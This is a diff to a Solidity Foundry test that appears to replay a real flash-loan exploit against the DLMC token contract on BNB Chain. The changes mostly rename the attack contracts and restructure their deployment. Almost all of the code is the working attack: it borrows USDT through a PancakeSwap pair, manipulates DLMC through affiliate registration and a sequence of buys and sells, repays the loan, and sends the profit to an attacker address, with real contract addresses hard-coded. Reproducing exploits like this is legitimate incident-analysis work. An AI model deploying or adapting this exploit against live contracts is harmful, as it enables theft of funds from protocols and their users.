@@ -36,19 +36,20 @@ contract AttackTest is Base {
 
     function testPoC() public {
         vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
-
-        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
-        vm.setNonce(ATTACK_CONTRACT, 1);
-
-        OurAttack attack = OurAttack(payable(ATTACK_CONTRACT));
-        attack._deployAttackChild();
-
-        _prepareProfit(address(attack), address(attack.flashSwapChild()));
+        OurAttack attack = _deployAttack();
+        _prepareProfit(address(attack), address(attack.pancakeAttackChild()));
         _logBalances("Before exploit");
         attack.attack{value: TX_VALUE}();
         _logBalances("After exploit");
         vm.stopPrank();
         _assertProfit();
+    }
+
+    function _deployAttack() internal returns (OurAttack attack) {
+        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
+        vm.setNonce(ATTACK_CONTRACT, 1);
+        attack = OurAttack(payable(ATTACK_CONTRACT));
+        attack._deployAttackChild();
     }
 
     function _expectProfitLegs(address attack, address attackChild) internal override {
@@ -60,23 +61,21 @@ contract AttackTest is Base {
 }
 
 contract OurAttack {
-    BuyHelper public buyHelper;
-    FlashSwapChild public flashSwapChild;
+    PancakeAttackChild public pancakeAttackChild;
 
     constructor() payable {
         _deployAttackChild();
     }
 
     function _deployAttackChild() public returns (address) {
-        flashSwapChild = new FlashSwapChild();
-        require(address(flashSwapChild) == Addresses.created_attack_contract_0A04, "unexpected attack child");
-        return address(flashSwapChild);
+        pancakeAttackChild = new PancakeAttackChild();
+        require(address(pancakeAttackChild) == Addresses.created_attack_contract_0A04, "unexpected attack child");
+        return address(pancakeAttackChild);
     }
 
     function attack() public payable {
-        // Unresolved gap: action_0004-action_0006 are observed storage effects with no normal call renderer.
         _decodedCall(
-            address(flashSwapChild),
+            address(pancakeAttackChild),
             abi.encodeWithSelector(
                 bytes4(0x16521e5a),
                 uint256(420000000000000000000000),
@@ -92,43 +91,40 @@ contract OurAttack {
         if (msg.data.length == 0) return;
     }
 
-    function bindAttackChild(address attackChildAddress) external {
-        buyHelper = BuyHelper(payable(attackChildAddress));
-    }
-
     function _decodedCall(address target, bytes memory data) internal {
         (bool ok,) = target.call(data);
         require(ok, "attack child dispatch failed");
     }
 }
 
-contract BuyHelper {
+contract AttackChild {
     receive() external payable {}
 
     fallback() external payable {
         if (msg.data.length == 0) return;
         if (msg.sig == 0xa2608d86) {
-            _buyWithApproval();
+            _buyWithBorrowedUsdt();
             return;
         }
     }
 
     function approveProtocolSpenders() external payable {
-        _buyWithApproval();
+        _buyWithBorrowedUsdt();
         return;
     }
 
-    function _buyWithApproval() internal {
+    function _buyWithBorrowedUsdt() internal {
         IDLMC(Addresses.DLMC).registerAffiliate(Addresses.created_attack_contract_0A04);
         IERC20Like(Addresses.USDT).approve(Addresses.DLMC, type(uint256).max);
         IDLMC(Addresses.DLMC).buy(1000000000000000000000000);
     }
+
+    function _prepareAttackChild() public {}
 }
 
-contract FlashSwapChild {
-    bytes32 private constant REPLAY_CALLBACK_5 = keccak256("poc.replay.REPLAY_CALLBACK_5");
-
-    mapping(bytes32 => bool) private _replayDone;
+contract PancakeAttackChild {
+    bytes32 private constant FLASH_CALLBACK = keccak256("poc.flashCallback");
+    mapping(bytes32 => bool) private _callbackDone;
 
     receive() external payable {}
 
@@ -137,35 +133,30 @@ contract FlashSwapChild {
         amount0;
         amount1;
         data;
-        if (!_replayDone[REPLAY_CALLBACK_5]) flashCallback2();
+        if (!_callbackDone[FLASH_CALLBACK]) flashCallback2();
         return;
     }
 
     fallback() external payable {
         if (msg.data.length == 0) return;
         if (msg.sig == 0x16521e5a) {
-            _executeFlashSwap();
+            _startPancakeSwap();
             return;
         }
     }
 
     function flashCallback() external payable {
-        if (!_replayDone[REPLAY_CALLBACK_5]) flashCallback2();
+        if (!_callbackDone[FLASH_CALLBACK]) flashCallback2();
         return;
     }
 
-    function _executeFlashSwap() internal {
+    function _startPancakeSwap() internal {
         IUniswapV2PairLike(Addresses.Cake_LP)
-            .swap(
-                1420000000000000000000000,
-                0,
-                Addresses.created_attack_contract_0A04,
-                hex"0000000000000000000000000000000000000000000000000000000000000001"
-            );
+            .swap(1420000000000000000000000, 0, Addresses.created_attack_contract_0A04, abi.encode(uint256(1)));
     }
 
     function flashCallback2() internal {
-        _replayDone[REPLAY_CALLBACK_5] = true;
+        _callbackDone[FLASH_CALLBACK] = true;
         flashCallback3();
     }
 
@@ -173,11 +164,12 @@ contract FlashSwapChild {
         IDLMC(Addresses.DLMC).registerAffiliate(Addresses.A_62CEFE_D792);
         IERC20Like(Addresses.USDT).approve(Addresses.DLMC, type(uint256).max);
         IDLMC(Addresses.DLMC).buy(420000000000000000000000);
-        BuyHelper buyHelper = new BuyHelper();
-        require(address(buyHelper) == Addresses.attack_child, "unexpected attack child");
-        IERC20Like(Addresses.USDT).transfer(address(buyHelper), 1000000000000000000000000);
+        AttackChild attackChild = new AttackChild();
+        require(address(attackChild) == Addresses.attack_child, "unexpected attack child");
+        attackChild._prepareAttackChild();
+        IERC20Like(Addresses.USDT).transfer(address(attackChild), 1000000000000000000000000);
         _decodedCall(
-            address(buyHelper),
+            address(attackChild),
             abi.encodeWithSelector(
                 bytes4(0xa2608d86),
                 uint256(0x000000000000000000000000f2ca2a3572b26ae7c479dc7ae36d922113b1bdf2),
@@ -187,12 +179,12 @@ contract FlashSwapChild {
             )
         );
         IDLMC(Addresses.DLMC).livePrice();
-        IERC20Like(Addresses.DLMC).balanceOf(address(this));
+        IERC20Like(Addresses.DLMC).balanceOf(Addresses.created_attack_contract_0A04);
         IERC20Like(Addresses.USDT).balanceOf(Addresses.DLMC);
         IDLMC(Addresses.DLMC).sell(65908685295332365480640);
         IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP, 1423558897243107769423559);
-        uint256 profitTokenBalance = IERC20Like(Addresses.USDT).balanceOf(address(this));
-        IERC20Like(Addresses.USDT).transfer(Addresses.A_701BB7_9699, profitTokenBalance);
+        IERC20Like(Addresses.USDT).balanceOf(Addresses.created_attack_contract_0A04);
+        IERC20Like(Addresses.USDT).transfer(Addresses.A_701BB7_9699, 222560221693222099016479);
     }
 
     function _decodedCall(address target, bytes memory data) internal {
@@ -202,20 +194,15 @@ contract FlashSwapChild {
 }
 
 library Addresses {
-    address internal constant ZERO = address(0);
     address internal constant Cake_LP = 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE;
     address internal constant attack_path_entry = 0x4adbDDEA5781cAccADD9F73f00E07201b541414e;
     address internal constant USDT = 0x55d398326f99059fF775485246999027B3197955;
-    address internal constant A_61E7F1_BCF5 = 0x61e7f1D43567E380ea5B4E7Ac81d6FFEbF1BBCF5;
     address internal constant A_62CEFE_D792 = 0x62cefE76EEcc737D7ee384eFDbAd8D2C53c1d792;
     address internal constant A_701BB7_9699 = 0x701Bb7B460ae231DBBcFA3d87f0aB5B458429699;
     address internal constant attacker_eoa = 0x74c4A756933D0F713FAcB1DeA325eF511646c3B1;
     address internal constant attack_child = 0x8B5A72C4ce0d3a7676ce06B8E42AeB255bBa476e;
-    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
-    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
     address internal constant created_attack_contract_0A04 = 0xE81Bf6E392ECa9aD594B5452ea53cF7071760a04;
     address internal constant DLMC = 0xF2ca2A3572B26Ae7c479dC7ae36D922113B1bdF2;
-    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
 }
 
 interface IDLMC {
